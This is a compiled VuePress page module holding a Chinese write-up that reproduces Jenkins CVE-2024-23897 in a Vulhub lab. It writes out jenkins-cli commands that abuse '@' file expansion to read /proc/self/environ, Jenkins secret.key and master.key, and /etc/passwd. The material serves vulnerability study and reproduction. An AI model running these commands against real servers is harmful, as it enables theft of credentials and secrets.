import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as r,c as o,a as e,b as a,d as i,e as c}from"./app-58e4a7d6.js";const d={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"Jenkins是一个开源的自动化服务器。",-1),u={href:"https://github.com/kohsuke/args4j",target:"_blank",rel:"noopener noreferrer"},h=e("code",null,"@",-1),g=e("p",null,"该漏洞影响Jenkins 2.441及以前的版本。",-1),m=e("p",null,"参考链接：",-1),v={href:"https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314",target:"_blank",rel:"noopener noreferrer"},_={href:"https://mp.weixin.qq.com/s/2a4NXRkrXBDhcL9gZ3XQyw",target:"_blank",rel:"noopener noreferrer"},b=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个Jenkins server 2.441：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问<code>http://your-vps-ip:8080/</code>即可查看到Jenkins登录页面，默认的管理员帐号密码为<code>admin</code>和<code>vulhub</code>。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226110809748.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用该漏洞可以直接使用官方提供的命令行客户端，在<code>http://your-vps-ip:8080/jnlpJars/jenkins-cli.jar</code>下载。</p><p>使用该工具读取目标服务器的<code>/proc/self/environ</code>文件，可以找到Jenkins的基础目录，<code>JENKINS_HOME=/var/jenkins_home</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar jenkins-cli.jar -s http://your-vps-ip:8080/ -http help 1 &quot;@/proc/self/environ&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226111050854.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可在该目录下读取敏感文件，如<code>secrets.key</code> or <code>master.key</code>（匿名情况下，只能通过命令行的报错读取文件的第一行）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar jenkins-cli.jar -s http://your-vps-ip:8080/ -http help 1 &quot;@/var/jenkins_home/secret.key&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226111129958.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar jenkins-cli.jar -s http://your-vps-ip:8080/ -http help 1 &quot;@/var/jenkins_home/secrets/master.key&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226111213576.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>因为开启了“匿名用户可读”选项，也可以直接使用<code>connect-node</code>命令读取完整文件内容：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar jenkins-cli.jar -s http://your-vps-ip:8080/ -http connect-node &quot;@/etc/passwd&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240226111243331.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,18);function k(f,x){const t=s("ExternalLinkIcon");return r(),o("div",null,[l,p,e("p",null,[a("Jenkins使用"),e("a",u,[a("args4j"),i(t)]),a("来解析命令行输入，并支持通过HTTP、Websocket等协议远程传入命令行参数。args4j中用户可以通过"),h,a("字符来加载任意文件，这导致攻击者可以通过该特性来读取服务器上的任意文件。")]),g,m,e("ul",null,[e("li",null,[e("a",v,[a("https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314"),i(t)])]),e("li",null,[e("a",_,[a("https://mp.weixin.qq.com/s/2a4NXRkrXBDhcL9gZ3XQyw"),i(t)])])]),b])}const w=n(d,[["render",k],["__file","Jenkins CLI 接口任意文件读取漏洞 CVE-2024-23897.html.vue"]]);export{w as default};
